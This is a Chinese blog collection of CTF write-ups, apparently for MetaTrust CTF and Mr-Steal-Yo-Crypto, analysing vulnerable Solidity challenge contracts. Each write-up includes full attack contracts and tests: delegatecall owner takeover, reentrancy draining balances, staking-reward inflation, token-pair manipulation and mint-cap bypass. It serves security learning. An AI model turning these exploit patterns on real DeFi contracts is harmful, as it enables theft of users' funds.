考察delegatecall，delegatecall调用执行的是调用者的上下文，即Vault合约的上下文，在Logic合约中changeOwner函数的password实际上是Vault的logic变量，且修改的owner是Vault的owner，withdraw函数中的owner则是Vault中的owner。根据这些对应关系可以通过changeOwner修改owner为hacker，然后调用withdraw函数。 3. 攻击合约123456789101112131415161718192021222324252627contract GreeterVaultHacker &#123; SetUp setup; Vault vault; address logic; constructor(address _setup) &#123; setup = SetUp(_setup); vault = Vault(setup.vault()); logic = setup.logic(); &#125; function attack() public &#123; // become owner (bool success1, ) = address(vault).call(abi.encodeWithSelector(VaultLogic.changeOwner.selector, bytes32(uint(uint160(logic))), address(this))); require(success1, &quot;call changOwner fail&quot;); // withdraw money (bool success2, ) = address(vault).call(abi.encodeWithSelector(VaultLogic.withdraw.selector)); require(success2, &quot;call withdraw fail&quot;); require(setup.isSolved(), &quot;You don&#x27;t slove the challenge&quot;); &#125; receive() external payable&#123;&#125; &#125; greeterGate1. 要求 成功调用Gate合约中的isSolved()函数。 2. 分析 通过resolve调用unlock()，只需从合约中获取data[2]的值即可，data[2]的值在slot5。 3. 攻击合约123456789101112131415161718contract Hacker &#123; Gate gate; constructor(address _gate) &#123; gate = Gate(_gate); &#125; function attack(bytes32 data_2) public &#123; bytes memory _calldate = abi.encodeWithSelector(Gate.unlock.selector, abi.encodePacked(data_2)); gate.resolve(_calldate); require(gate.isSolved(), &quot;You don&#x27;t solve the challage&quot;); &#125; &#125; bytecodeVault1. 要求 成功调用isSolved()函数 2. 分析 目标是将vault的钱掏空，涉及转账操作的只有withdrawn函数。分析该函数 123456789assembly &#123; let size := extcodesize(bytecaller) // msg.sender的代码大小 senderCode := mload(0x40) // 返回空闲内存指针 // add(0x1f, not(0x1f)) == type(uint).max mstore(0x40, add(senderCode, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(senderCode, size) // 修改bytes的长度 // 将bytecaller的代码从0（头）开始拷贝到senderCode的位置 extcodecopy(bytecaller, add(senderCode, 0x20), 0, size)&#125; 解读内联汇编部分，size表示统计调用者的code size， senderCode则是返回空闲内存指针，mstore(0x40, add(senderCode, and(add(add(size, 0x20), 0x1f), not(0x1f))))，表示更新空闲指针的位置，新位置在，动态数组senderCode加上bytecaller的代码之后（这是在提前算好位置，方便下一步拷贝代码）。extcodecopy(bytecaller, add(senderCode, 0x20), 0, size)这是将代码拷贝到senderCode数组，其中跳过了存储数组长度的位置。 试了一下，我发现对于这个msg.sender，ta的code size好像和状态变量无关，如果在attack函数调用withdraw，我在attack中加入其他代码，会影响到excodesize的值，这让我感到很奇怪。同理对于下面的代码拷贝，extcodecopy也是拷贝函数体中的代码。。。。我不是很理解 123456789for(uint256 i = 0; i &lt; senderCode.length - 3; i++) &#123; if(senderCode[i] == byte(uint8(sequence &gt;&gt; 24)) // de &amp;&amp; senderCode[i+1] == byte(uint8((sequence &gt;&gt; 16) &amp; 0xFF)) // ad &amp;&amp; senderCode[i+2] == byte(uint8((sequence &gt;&gt; 8) &amp; 0xFF)) // be &amp;&amp; senderCode[i+3] == byte(uint8(sequence &amp; 0xFF))) &#123; // ef msg.sender.transfer(address(this).balance); return; &#125;&#125; 这里则表示在senderCode中必须要包含 deadbeef，所以呢，需要在attack函数中定义一个变量，并赋值为deadbeef即可。 require(senderCode.length % 2 == 1, &quot;Bytecode length must be even!&quot;);可以通过在攻击合约中添加一些多余的代码，知道大小为奇数即可。 3. 攻击合约12345678910111213141516contract BytecodeVaultHack &#123; BytecodeVault vault; constructor(address _vault) public &#123; vault = BytecodeVault(_vault); &#125; function attack() public &#123; uint256 sequence = 0xdeadbeef; vault.withdraw(); require(vault.isSolved(), &quot;You don&#x27;t solve the challenge&quot;); &#125; function() external payable&#123;&#125;&#125; Achilles1. 要求 成功调用isSolved()函数 2. 分析 该题的目标是为指定地址盗取大于100 ether的 WETH代币。 仔细分析代码可知在Achilles合约中提供了一个空投函数，可以修改airdropAmount的值，而执行条件可以通过swap中的闪电贷来满足，即大量借出 pair的achilles代币，并调用此函数。而transfer函数则可以进入内置空投函数_airdrop，可以修改某地址的achilles代币。想通过swap函数盗币，必须要满足滑点不变，即require(balance0Adjusted.mul(balance1Adjusted) &gt;= uint(_reserve0).mul(_reserve1).mul(10000**2), &#39;Pancake: K&#39;);，仔细观察可知，只要将不等式右边的值变得很小，或者将左边的值变得很大皆可满足，根据初始化的条件可知achilles is token0，而在_airdrop中可以随意修改某地址的值，所以就可以在此处修改pair的achilles代币的值，将其变得很小满足借出 100 ether WETH滑点仍然满足。 若是只改变上述的值，函数将会失败，报错在require(amount0In &gt; 0 || amount1In &gt; 0, &#39;Pancake: INSUFFICIENT_INPUT_AMOUNT&#39;);，分析可知，balance和reserve获取的方式不一样，所以只要使得balance和reserve不一致即可，实现方式是通过_airdrop函数，为hacke铸币，然后将币转给pair地址，使得balance大于reserve，这里对应的是uint amount0In = balance0 &gt; _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0; 综上，攻击思路为：将pair的Achilles代币修改为balance，同步（sync），再为pair转一些Achilles代币，目的是使得balance和reserve不相等。 3. 攻击合约123456789101112131415161718192021222324252627282930313233343536373839404142434445contract AchillesHacker &#123; SetUp setup; Achilles achilles; PancakePair pair; WETH weth; address estinationAddress; constructor(address _setup) &#123; setup = SetUp(_setup); achilles = setup.achilles(); pair = setup.pair(); weth = setup.weth(); estinationAddress = setup.yourAddress(); &#125; function pwn() public &#123; // in order to satisfy `weth.balanceOf(address(pair)) / this.balanceOf(address(pair)) &gt; 5` uint achillesMoney = 999 ether; pair.swap(achillesMoney, 0, address(this), &quot;0x999&quot;); // achilles is token0 // cal pair&#x27;address uint256 fakeTo = (uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(pair))); // set achilles&#x27;s balanceOf(pair) = 1 wei achilles.transfer(address(uint160(fakeTo)), 0); // sync, update achilles.balanceOf(pair) = 1 wei pair.sync(); // mint achilles token for hack uint256 hacker = (uint160(address(this)) | block.number) ^ (uint160(address(this)) ^ uint160(address(this))); achilles.transfer(address(uint160(hacker)), 0); // transfer for weth&#x27;address or achilles&#x27;address to ensure `require(amount0In &gt; 0 || amount1In &gt; 0, &#x27;Pancake: INSUFFICIENT_INPUT_AMOUNT&#x27;);` achilles.transfer(address(pair), 1); // swap weth pair.swap(0, 100 ether, estinationAddress, &quot;&quot;); require(setup.isSolved(), &quot;You don&#x27;t solve....&quot;); &#125; Who1. 要求 成功调用isSolved()函数 2. 分析 突破四道防线。 首先通过脚本计算，成为owner 防线一 通过调用check()返回不同的结果，由于是staticcall调用，所以只能通过冷热地址消耗的gas不同来实现 防线二 通过限制gas，实现this._stage2() == 7，方法为爆破 防线三 block.timestamp可控，可以在同一个函数事先排好顺序，自己实现sort()函数，使其功能为只返回一个数组，这样消耗的gas较少 防线四 计算出 mapping某值所在的位置，然后将其覆盖，计算公式为keccak256(abi.encode(address(this), keccak256(abi.encode(uint(4), uint(1)))))。 3. 攻击合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112contract FooHacker &#123; Foo foo; uint256[] challenge = new uint256[](8); constructor(address _foo) &#123; foo = Foo(_foo); &#125; function pwn1() public &#123; // create2 address(this) foo.setup(); // become owner foo.stage1(); // stats[1][msg.sender] = true &#125; function pwn2() public &#123; for (uint i = 40000; i &lt; 41000; i++) &#123; (bool success, ) = address(foo).call&#123;gas: i&#125;(abi.encodeWithSignature(&quot;stage2()&quot;)); if (success) &#123; break; &#125; &#125; &#125; function pwn3() public &#123; challenge[0] = (block.timestamp &amp; 0xf0000000) &gt;&gt; 28; challenge[1] = (block.timestamp &amp; 0xf000000) &gt;&gt; 24; challenge[2] = (block.timestamp &amp; 0xf00000) &gt;&gt; 20; challenge[3] = (block.timestamp &amp; 0xf0000) &gt;&gt; 16; challenge[4] = (block.timestamp &amp; 0xf000) &gt;&gt; 12; challenge[5] = (block.timestamp &amp; 0xf00) &gt;&gt; 8; challenge[6] = (block.timestamp &amp; 0xf0) &gt;&gt; 4; challenge[7] = (block.timestamp &amp; 0xf) &gt;&gt; 0; this.bubbleSort(challenge); // sort the _challenge foo.stage3(); &#125; function pwn4() public &#123; foo.stage4(); &#125; /* calculate the location of stats[4][address(this)] */ function pos() external view returns (bytes32) &#123; return keccak256(abi.encode(address(this), keccak256(abi.encode(uint(4), uint(1))))); &#125; /* only return the uint256[], the operation spend gas is low */ function sort(uint256[] memory) public view returns(uint256[] memory) &#123; return challenge; &#125; /* the block.stamp is controled, sort the arr in advance */ function bubbleSort(uint256[] memory challenge) external &#123; /* bubble sort */ for(uint i=0 ; i&lt;8 ; i++) &#123; for(uint j=i+1 ; j&lt;8 ; j++) &#123; if (challenge[i] &gt; challenge[j]) &#123; uint tmp = challenge[i]; challenge[i] = challenge[j]; challenge[j] = tmp; &#125; &#125; &#125; &#125; /* the first call is cold address spend gas:2600, return 1337; the secode call is warm address spend gas:100, return 13337. */ function check() external view returns(bytes32) &#123; uint startgas = gasleft(); uint balance = address(0x0).balance; uint gasused = startgas - gasleft(); if (gasused &gt;= 2600) &#123; return keccak256(abi.encodePacked(&quot;1337&quot;)); &#125; return keccak256(abi.encodePacked(&quot;13337&quot;)); &#125;&#125;/* deploy hacker to satisfy address % 1000 == 137*/contract FooHackerDeployer &#123; function deploy(uint _salt, address foo) external returns (address hacker) &#123; bytes memory bytecode = abi.encodePacked(type(FooHacker).creationCode, abi.encode(foo)); bytes32 salt = keccak256(abi.encodePacked(_salt)); assembly &#123; hacker := create2(0, add(bytecode, 0x20), mload(bytecode), salt) &#125; &#125;&#125; StakingPool1. 要求 成功调用SetUp的isSolved()函数 2. 分析 两种不同的rewardToken，分别分析。 对于rewardToken： 可以看到在 deposit和withdraw函数中都可以获得rewardToken，不过获取奖励有要求： 12345678910// requset1 user.amount &gt; 0// requset2pending = user.amount * (accTokenPerShare[rewardTokens[i]]) / (PRECISION_FACTOR[rewardTokens[i]]) - (user.rewardDebt[rewardTokens[i]]);pending &gt; 0// requset3// 如果 pending &gt; ERC20(rewardTokens[i]).balanceOf(address(pool))// 则可以一次性将pool池的奖励掏空 pending 受 user.amount，accTokenPerShare[rewardTokens[i]]，PRECISION_FACTOR[rewardTokens[i]]和user.rewardDebt[rewardTokens[i]]影响，分析这个值 12345678910111213141516171819// user.amountuser.amount = user.amount + (_amount);// accTokenPerShare[rewardTokens[i]]bscsReward = _getMultiplier(lastRewardBlock, block.number) * (rewardPerBlock[rewardTokens[i]]);accTokenPerShare[rewardTokens[i]] = accTokenPerShare[rewardTokens[i]] + (bscsReward * (PRECISION_FACTOR[rewardTokens[i]]) / (stakedTokenSupply));// PRECISION_FACTOR[rewardTokens[i]]PRECISION_FACTOR[_rewardTokens[i]] = uint256(10**(uint256(30) - decimalsRewardToken)); // 定值 10 ** 12// user.rewardDebt[rewardTokens[i]]user.rewardDebt[rewardTokens[i]] = user .amount * (accTokenPerShare[rewardTokens[i]]) / (PRECISION_FACTOR[rewardTokens[i]]); 可以看到 accTokenPerShare[rewardTokens[i]] 的值主要是受 block.number影响，但是_getMultiplier(lastRewardBlock, block.number)的最大值是60，而这远不足 1000（* 10 ** 23），所以得从其他的变量（user.amount 和 user.rewardDebt[rewardTokens[i]]）下手。 要使得pending的值很大，只能将 user.amount 变得很大， user.rewardDebt[rewardTokens[i]]变得很小。 user.amount ：可以通过控制存入的钱来控制大小，但是这样一来，存的越多，user.rewardDebt[rewardTokens[i]]的值则会变得越大，这不符合我的初衷。 user.rewardDebt[rewardTokens[i]]：其值受到存钱的多少控制，存得越多，其值越大 但是，这里需要注意的是，pending中的(user.rewardDebt[rewardTokens[i]]是来源于上一次的，所以只要想办法让user.amount的增大和user.rewardDebt[rewardTokens[i]]不同步即可！！！注意到transfer函数，这个函数不涉及user.rewardDebt[rewardTokens[i]]变量，只涉及了user.amount，所以可以通过另一个账户存入很多钱，然后通过transfer函数转给hacker，使得hacker的user.amount增大而不改变user.rewardDebt[rewardTokens[i]]的值，从而使得pending的值变得很大。 这里蛮有意思的，按理来说可以不事前存一点点钱的，但是如果不事先存一点点的话，就不会更新user.rewardDebt[rewardTokens[i]]的值，怎么说呢：如果helper往pool里面存钱，则是第一次调用_updatePool()，那么因为池子里面是空的，所以将在第二个if语句被退出；当hacker执行withdraw函数时，pending的值便是零。 因此，执行逻辑为： hacker先deposit，修改pool的余额，此时因为执行_updatePool()的时候被return了，所以accTokenPerShare[rewardTokens[i]]的值未被赋值所以是0，因此user.rewardDebt[rewardTokens[i]]也是0 vm.roll(51)，区块高度增加50个之后 helper执行deposit，此时可以完整执行_updatePool，更新accTokenPerShare[rewardTokens[i]]的值，user.rewardDebt[rewardTokens[i]]的值会被更新，但是这是helper的不是hacker的 helper执行transfer，增加hacker的user.amount hacker执行withdraw，此时具备天时地利人和，user.amount的值很大，accTokenPerShare[rewardTokens[i]]不为零且数值很大，user.rewardDebt[rewardTokens[i]]为0，所以此时可以满足 pending &gt; ERC20(rewardTokens[i]).balanceOf(address(pool)) 对于rewardToken2： 同 rewardToken，只不过多一步自己给自己转账的操作，给自己转五次即可。 3. 攻击合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;../../../src/MetaTrustCTF/StakingPool/StakingPoolsDeployment.sol&quot;;import &quot;forge-std/Test.sol&quot;;contract StakingPoolExploit &#123; StakingPoolsDeployment deployment; StakingPools pool; address yourAddress; ERC20 stakedToken; ERC20 rewardToken; ERC20V2 rewardToken2; StakingPoolHelper helper; constructor(address _deployment) &#123; deployment = StakingPoolsDeployment(_deployment); pool = deployment.stakingPools(); stakedToken = deployment.stakedToken(); rewardToken = deployment.rewardToken(); rewardToken2 = deployment.rewardToken2(); yourAddress = deployment.yourAddress(); helper = new StakingPoolHelper(_deployment); &#125; function pwn1() public &#123; deployment.faucet(); stakedToken.approve(address(pool), type(uint256).max); // 存入少量的stakedToken pool.deposit(1); &#125; // after 50 block function pwn2() public &#123; helper.pwn(); // get 1e8 * 1e18 rewardToken pool.withdraw(1 ether); // 利用 rewardToken2 transfer 漏洞 for (uint i; i &lt; 5; i++) &#123; rewardToken2.transfer(address(this), rewardToken2.balanceOf(address(this))); &#125; rewardToken.transfer(yourAddress, rewardToken.balanceOf(address(this))); rewardToken2.transfer(yourAddress, rewardToken2.balanceOf(address(this))); &#125; function is_Solved() public view &#123; require(deployment.isSolved(), &quot;!sovled&quot;); &#125;&#125;contract StakingPoolHelper &#123; StakingPoolsDeployment deployment; StakingPools pool; ERC20 stakedToken; constructor(address _deployment) &#123; deployment = StakingPoolsDeployment(_deployment); pool = deployment.stakingPools(); stakedToken = deployment.stakedToken(); &#125; function pwn() public &#123; // 领取 stakedToken deployment.faucet(); stakedToken.approve(address(pool), type(uint256).max); // 存入大量的 stakedToken pool.deposit(1 ether); // 将这些 poolToken转移给 exploiter，修改其 user.amount pool.transfer(msg.sender, 1 ether); &#125;&#125; 测试： 12345678910111213141516171819202122232425262728293031323334353637//SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./StakingPoolExploit.sol&quot;;contract TestStakingPoolExploit is Test &#123; StakingPoolsDeployment deployment; StakingPools pool; StakingPoolExploit exploit; address yourAddress; function setUp() public &#123; deployment = new StakingPoolsDeployment(); pool = deployment.stakingPools(); exploit = new StakingPoolExploit(address(deployment)); yourAddress = deployment.yourAddress(); &#125; function test_isSolved() public &#123; // first pwn1() exploit.pwn1(); /* wait... */ // after 50 block vm.roll(51); // second pwn2() exploit.pwn2(); exploit.is_Solved(); assertEq(deployment.isSolved(), true); &#125;&#125; DeFi Maze1. 要求 成功调用SetUp的isSolved()函数 2. 分析 根据SetUp的isSolve函数看到Vault合约的isSolve函数，要求storedFlag == flagHash，即要求sload(keccak256(0,32)) == flagHash == storedFlag，processWithdrawal函数涉及了修改slot(keccak256(0,32))插槽的值，但只能通过platformAddress来调用，requestWithdrawal()函数涉及调用通过，但是需要满足两个条件deposits[msg.sender] &gt;= amount &gt;= 7 ether，yieldCalculated[msg.sender] == true，这两个条件很好通过，调用calculateYield()函数，传入 1.1.1即可使得deposits[msg.sender]&gt;7 ether，随后便可成功调用requestWithdrawal函数。 3. 攻击合约123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.8.16;import &quot;hardhat/console.sol&quot;;interface IVault &#123; function solved() external view returns(bool); function isSolved() external;&#125;interface IDeFiPlatform &#123; function calculateYield(uint256 principal, uint256 rate, uint256 time) external returns(uint256); function requestWithdrawal(uint256 amount) external;&#125;interface ISetUp &#123; function platfrom() external view returns(IDeFiPlatform); function vault() external view returns(IVault); function isSolved() external view returns(bool);&#125;contract MazeHacker &#123; ISetUp setup; IDeFiPlatform platfrom; IVault vault;// 0xf5a45510f4f184329E39E3D2d0825169462fC0ae constructor(address _setup) &#123; setup = ISetUp(_setup); platfrom = setup.platfrom(); vault = setup.vault(); &#125; function attack() public &#123; platfrom.calculateYield(1,1,1); platfrom.requestWithdrawal(7 ether); vault.isSolved(); require(vault.solved(), &quot;You don&#x27;t solve!&quot;); &#125;&#125; guseeGame1. 要求 猜中guessGame.guess()函数中的四个参数 2. 分析 在构造函数中调用了pureFunc()函数，修改了random01 random02 random03的值为 1 ，2 ，32 分析guess函数可知，里面包含四个考点 修改memory中的保留位置（动态数组的长度保留位：0x60），通过msg.value控制，使其等于1 计算_random02，使其(uint256(uint160(address(hacker))) + 35 + _random02) &amp; 0xFF == 2 address(2)的考察，调用该地址的函数，都会返回 32 bytes的data 这给考点很离谱，教会了我眼见不一定为实，这里的题中初始化的A 合约地址并不是眼见的 A ，而是另有一个合约，使得返回的结果并不是10，所以这里还得通过函数调用求出来，不能直接写死等于10。 3. 攻击合约12345678910111213141516171819202122232425262728293031323334353637383940414243contract GuessGameExploit &#123; SetUp setup; A a ; GuessGame game; constructor(address _setup) &#123; setup = SetUp(_setup); a = setup.a(); game = setup.guessGame(); &#125; function pwn() public payable &#123; require(msg.value == 1, &quot;You must pay 1 wei&quot;); // to set arr.length to be 1. uint256 _random01 = 0x60; // location(arr.length) == 0x60 // make the result of addtion equal 2 uint256 _random02 = cal_random02(); // address(2).call(&quot;anything&quot;) will return data(the length is 32bytes) uint256 _random03 = 2; // will be address(2) // read random04.number uint256 _random04 = a.number(); game.guess&#123;value:1&#125;(_random01, _random02, _random03, _random04); &#125; function cal_random02() internal view returns(uint _random02) &#123; while(true) &#123; if ((uint256(uint160(address(this))) + 35 + _random02) &amp; 0xFF == 2) &#123; break; &#125; _random02++; &#125; &#125; fallback() external payable &#123;&#125;&#125; NaryaRegistry1. 要求 触发FLAG事件。 2. 分析 不难发现，触发FLAG的前提是将 hacker的balances减到 0xDAO，即3488。 涉及修改balance的函数只有pwn()，分析pwn()函数 12345678910111213141516171819202122232425262728function pwn(uint256 _amount) public &#123; address sender = msg.sender; require(PwnLogs[sender] == 0, &quot;Only ONCE. No More!&quot;); if ( _amount &lt; records1[sender] || _amount &lt; records2[sender] || records1[sender] + (records2[sender]) != _amount ) &#123; return; &#125; if (balances[sender] &gt;= _amount) &#123; records1[sender] = records2[sender]; records2[sender] = _amount; (bool result, ) = sender.call( abi.encodeWithSignature(&quot;PwnedNoMore(uint256)&quot;, _amount) ); if (result) &#123; result; &#125; balances[sender] = balances[sender] - (_amount); &#125; PwnLogs[sender] = 1;&#125; 看出来进入第二个if的要求是 _amount &gt;&#x3D; records1[sender]，_amount &gt;&#x3D; records1[sender] records1[sender] + (records2[sender] ) &#x3D;&#x3D; _amount 而第二个if的操作则是 records1[sender] &#x3D; records2[sender]; records2[sender] &#x3D; _amount; 综上，可以看出这和斐波那契数列的计算方式特别相似！！！ 我要做的是，让balance[hacker] - (59425114757512643212875124 - records1[msg.sender] - records2[msg.sender])，而59425114757512643212875124 这个数很奇怪，chatgpt一下，假如斐波那契数列以[1,1…]开头的话，则该值是前 122 项的和。 sender.call(abi.encodeWithSignature(&quot;PwnedNoMore(uint256)&quot;, _amount)这里提供了重入漏洞，假如我调用一次pwn(2)，再重入 121次的话，则恰好可以将 59425114757512643212875122 减掉。 _amount的值的变化为：pwn(2)&#x3D;&gt;pwn(3)&#x3D;&gt;pwn(5)&#x3D;&gt;…&#x3D;&gt;pwn(14028366653498915298923761)&#x3D;&gt;pwn(22698374052006863956975682) 为了配合callTimes和_amount的变化，可以构建一个斐波那契数列。 remix上做不了，重入50多次则会退出，可以采用foundry来测试 3. 攻击合约1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;../../../src/MetaTrustCTF/NaryaRegistry/NaryaRegistry.sol&quot;;import &quot;forge-std/Test.sol&quot;;contract NaryaRegistryExploit &#123; NaryaRegistry register; uint256[] amounts; uint256 callTimes; constructor(address _register) &#123; register = NaryaRegistry(_register); initializes(); &#125; function pwn() public &#123; // 1. register() =&gt; records1[msg.sender] = 1, records2[msg.sender] = 1; register.register(); // 2. parameter = 2, because: amount = records1[msg.sender] + records2[msg.sender] = 2 register.pwn(2); // 3. judge hacked register.identifyNaryaHacker(); require(register.isNaryaHacker(address(this)), &quot;!solved&quot;); &#125; // init the array of fabonacci function initializes() internal &#123; uint a = 1; uint b = 1; uint c; for(uint i; i &lt; 121; i++) &#123; c = a + b; amounts.push(c); a = b; b = c; &#125; &#125; function PwnedNoMore(uint256) public &#123; if (callTimes &lt; 121) &#123; ++callTimes; // save gas register.pwn(amounts[callTimes]); &#125; &#125;&#125; 测试： 1234567891011121314151617181920212223242526// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;forge-std/Test.sol&quot;;import &quot;./NaryaRegistryExploit.sol&quot;;contract TestNaryaRegistryExploit is Test&#123; NaryaRegistry registry; NaryaRegistryExploit exploit; function setUp() public &#123; registry = new NaryaRegistry(); exploit = new NaryaRegistryExploit(address(registry)); &#125; function test_isSolved() public &#123; // pwn() exploit.pwn(); // output the balances[exploit] console2.log(&quot;balances[exploit]=&gt;&quot;, registry.balanceOf(address(exploit))); // assert assertEq(registry.isNaryaHacker(address(exploit)), true); &#125;&#125; 结果： ![image-20231118190025487](MetaTrust CTF&#x2F;image-20231118190025487.png) byteDance1. 要求 要求将合约中的solved修改为true。 2. 分析 分析checkCode函数，通过条件则是要求_yourcontract的runtimecode 全为奇数 要求runtimecode中包含应该bytedance 要求成功执行delegatecall 很显然，突破口在于delegatecall，通过执行_yourcontract修改solved的值。bytedance可以通过代码将其算出来，0-2**8之间所有满足条件的且为奇数的opcode’s number如下 12345678opcode=&gt; 129opcode=&gt; 153opcode=&gt; 165opcode=&gt; 189opcode=&gt; 195opcode=&gt; 219opcode=&gt; 231opcode=&gt; 255 实际上好用的是0x81，复制栈顶第二个元素，因为slot(solved)&#x3D;0，且题目要求字节码必须是奇数，这里可以采用sub的方式获取0这个值。 编写的字节码为：619999619999619999810355。 12345678OPCODE number valuePUSH2 61 9999PUSH2 61 9999PUSH2 61 9999DUP2 81SUB 03SSTORE 55 3. 攻击合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263contract ByteDanceExploit &#123; ByteDance dance; ByteDanceHelper helper; uint8[] public res; constructor(address _dance) &#123; dance = ByteDance(_dance); helper = new ByteDanceHelper(); &#125; function pwn() public &#123; dance.checkCode(address(helper)); require(dance.isSolved(), &quot;!solved&quot;); &#125; function search_Opcode() public &#123; bool loop; for (uint256 i; i &lt;= 0xFF; i++) &#123; loop = false; for (uint8 j; j &lt; 4; j++) &#123; uint8 binLeft = uint8(i) &gt;&gt; (uint8(7)-j) &amp; 0x01; uint8 binRight = uint8(i) &gt;&gt; j &amp; 0x01; if (binLeft != binRight) &#123; loop = true; break; &#125; &#125; if (!loop &amp;&amp; i % 2 == 1) &#123; res.push(uint8(i)); console.log(&quot;opcode=&gt;&quot;,i); &#125; &#125; &#125;&#125;contract ByteDanceHelper &#123; constructor() &#123; /* sstore(0, 9999) =&gt; to set `solved = true` opcode number value PUSH2 61 9999 PUSH2 61 9999 PUSH2 61 9999 DUP2 81 SUB 03 SSTORE 55 */ bytes memory runtimecode = hex&quot;619999619999619999810355&quot;; assembly &#123; return(add(runtimecode, 0x20), mload(runtimecode)) &#125; &#125;&#125;","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"MetaTrust CTF","slug":"CTFS/MetaTrust-CTF","permalink":"https://biyouqiuqiu.com/categories/CTFS/MetaTrust-CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Mr-Steal-Yo-Crypto(11-20)","slug":"CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(11-20)","date":"2023-09-09T03:50:10.000Z","updated":"2023-09-09T03:50:10.000Z","comments":true,"path":"2023/09/09/CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(11-20)/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/09/CTFS/Mr%20Steal%20Yo%20Crypto/Mr-Steal-Yo-Crypto(11-20)/","excerpt":"","text":"Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js Challenge 0 -1. question 2. analysis 3. solve攻击合约 12345```*ts文件代码*```js","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Mr Steal Yo Crypto","slug":"CTFS/Mr-Steal-Yo-Crypto","permalink":"https://biyouqiuqiu.com/categories/CTFS/Mr-Steal-Yo-Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Mr-Steal-Yo-Crypto(1-10)","slug":"CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(1-10)","date":"2023-09-09T03:50:10.000Z","updated":"2023-09-09T03:50:10.000Z","comments":true,"path":"2023/09/09/CTFS/Mr Steal Yo Crypto/Mr-Steal-Yo-Crypto(1-10)/","link":"","permalink":"https://biyouqiuqiu.com/2023/09/09/CTFS/Mr%20Steal%20Yo%20Crypto/Mr-Steal-Yo-Crypto(1-10)/","excerpt":"","text":"前言 📌 记录自己的解题过程，以及提高自己的代码阅读能力🤪 Challenge 01 - Jpeg Sniper1. question Hopegs the NFT marketplace is launching the hyped NFT collection BOOTY soon. They have a wrapper contract: FlatLaunchpeg, which handles the public sale mint for the collection. Your task is to bypass their safeguards and max mint the entire collection in a single tx. 题目的意思是：获取FlatLaunchpeg中的所有BOOTY。 2. analysis 通读代码可知本题的漏洞出现在FlatLaunchpeg合约的publicSaleMint函数中。 12345678910111213141516171819function publicSaleMint(uint256 _quantity) external payable isEOA atPhase(Phase.PublicSale)&#123; // 调用者的余额以及要铸币的次数相加起来必须要小于5 if (numberMinted(msg.sender) + _quantity &gt; maxPerAddressDuringMint) &#123; revert Launchpeg__CanNotMintThisMany(); &#125; // 发行量和铸币个数必须小于69 if (totalSupply() + _quantity &gt; collectionSize) &#123; revert Launchpeg__MaxSupplyReached(); &#125; uint256 total = salePrice * _quantity; // it is free _mintForUser(msg.sender, _quantity); _refundIfOver(total);&#125; 可以看到该题有两个修饰器，isEOA限制的调用者的代码量为零，言外之意就是需要调用者为EOA账户，但是，合约在创建时的代码大小也为0，即在构造函数中。至于atPhase修饰器嘛，我感觉形同虚设，currentPhase()的返回值都是Phase.PublicSale。 接下来看到函数体，要求调用者的余额以及待铸币个数的总和小于5（maxPerAddressDuringMint），且系统当前的发行量以及待铸币个数的总和小于69（collectionSize）。只要通过创建多个实例，并在他们的构造函数中完成铸币以及转账即可。 这题还有个难点就是gas run out of问题，必须能省则省，能不声明stroage变量则不声明，且创建的每一个合约都需要执行selfdestruct()操作，能返回一部分gas。 3. solve攻击合约 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;./FlatLaunchpeg.sol&quot;;import &quot;hardhat/console.sol&quot;;contract FlatLaunchpegHacker &#123; constructor(FlatLaunchpeg flatlaunchpeg) &#123; for (uint256 i = 0; i &lt; 69; i += 3) &#123; // 23 times console.log(&quot;startIndex = &quot;, i); new FlatLaunchpegHackerHepler(flatlaunchpeg, 3, i, msg.sender); &#125; &#125;&#125;contract FlatLaunchpegHackerHepler &#123; constructor(FlatLaunchpeg flatlaunchpeg, uint money,uint startIndex, address attacker) &#123; flatlaunchpeg.publicSaleMint(money); for (uint256 i = 0; i &lt; money; i++) &#123; flatlaunchpeg.transferFrom(address(this), attacker, startIndex+i); console.log(&quot;balance(attacker) = &quot;, flatlaunchpeg.balanceOf(attacker)); &#125; selfdestruct(payable(attacker)); // return some gas &#125;&#125; ts文件代码 123456it(&quot;solves the challenge&quot;, async function () &#123; // implement solution hereawait (await ethers.getContractFactory(&quot;FlatLaunchpegHacker&quot;, attacker)).deploy(flatLaunchpeg.address); &#125;); Challenge 02 - Safu 